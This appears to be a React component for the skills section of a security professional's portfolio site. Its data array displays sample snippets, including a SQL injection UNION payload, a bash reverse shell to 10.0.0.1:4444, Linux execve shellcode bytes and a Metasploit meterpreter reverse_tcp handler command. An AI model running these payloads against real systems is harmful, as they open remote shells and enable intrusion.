"use client"

import { motion } from "framer-motion"
import { useState } from "react"
import { HolographicCard } from "./holographic-card"
import { SkillOrb } from "./skill-orb"
import { CodeBlock } from "./code-block"

const skills = [
  {
    category: "Penetration Testing",
    icon: "🎯",
    skills: ["OWASP Top 10", "Buffer Overflow", "SQL Injection", "XSS", "CSRF", "RCE"],
    color: "from-red-400 to-orange-600",
    code: `
# SQL Injection Payload
' UNION SELECT 1,2,3,user(),database(),version()--

# Buffer Overflow Exploit
python3 -c "print('A'*140 + '\\x41\\x42\\x43\\x44')"

# Reverse Shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
    `,
  },
  {
    category: "Exploit Development",
    icon: "💥",
    skills: ["Assembly", "Shellcode", "ROP Chains", "Heap Exploitation", "Kernel Exploits", "0-day Research"],
    color: "from-purple-400 to-pink-600",
    code: `
# Shellcode (Linux x86_64)
\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68
\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05

# ROP Gadget
pop rdi; ret  # 0x400686
    `,
  },
  {
    category: "Network Security",
    icon: "🌐",
    skills: ["Nmap", "Wireshark", "Metasploit", "Burp Suite", "MITM", "WiFi Hacking"],
    color: "from-cyan-400 to-blue-600",
    code: `
# Advanced Nmap Scan
nmap -sS -sV -sC -O --script vuln target.com

# Metasploit Automation
msfconsole -q -x "use exploit/multi/handler; 
set payload linux/x86/meterpreter/reverse_tcp; 
set LHOST 10.0.0.1; exploit"
    `,
  },
  {
    category: "Forensics & Malware",
    icon: "🔍",
    skills: ["Volatility", "Autopsy", "Ghidra", "IDA Pro", "Radare2", "YARA Rules"],
    color: "from-yellow-400 to-red-600",
    code: `
# Memory Analysis with Volatility
volatility -f memory.dump --profile=Win10x64 pslist

# Malware Analysis
strings malware.exe | grep -i "http"
objdump -d malware.exe | grep call
    `,
  },
]

export function SkillsSection() {
  const [selectedSkill, setSelectedSkill] = useState(0)

  return (
    <section id="skills" className="py-20 px-4">
      <div className="max-w-7xl mx-auto">
        <motion.h2
          className="text-6xl font-bold text-center mb-16 text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-cyan-400"
          initial={{ opacity: 0, y: 50 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
        >
          {"# cat /proc/skills"}
        </motion.h2>

        <div className="grid lg:grid-cols-2 gap-12 items-start">
          <motion.div
            className="space-y-6"
            initial={{ opacity: 0, x: -50 }}
            whileInView={{ opacity: 1, x: 0 }}
            viewport={{ once: true }}
          >
            {skills.map((skill, index) => (
              <HolographicCard
                key={skill.category}
                className={`p-6 cursor-pointer transition-all duration-300 ${
                  selectedSkill === index ? "scale-105 shadow-2xl border-red-400" : ""
                }`}
                onClick={() => setSelectedSkill(index)}
              >
                <div className="flex items-center gap-4 mb-4">
                  <div className="text-4xl">{skill.icon}</div>
                  <h3 className="text-2xl font-bold text-white">{skill.category}</h3>
                </div>

                <div className="flex flex-wrap gap-2">
                  {skill.skills.map((s) => (
                    <SkillOrb key={s} skill={s} />
                  ))}
                </div>
              </HolographicCard>
            ))}
          </motion.div>

          <motion.div
            className="sticky top-20"
            initial={{ opacity: 0, x: 50 }}
            whileInView={{ opacity: 1, x: 0 }}
            viewport={{ once: true }}
          >
            <HolographicCard className="p-6">
              <h4 className="text-xl font-bold mb-4 text-red-400">
                # cat /usr/share/exploits/{skills[selectedSkill].category.toLowerCase().replace(" ", "_")}.sh
              </h4>
              <CodeBlock code={skills[selectedSkill].code} />
            </HolographicCard>
          </motion.div>
        </div>
      </div>
    </section>
  )
}
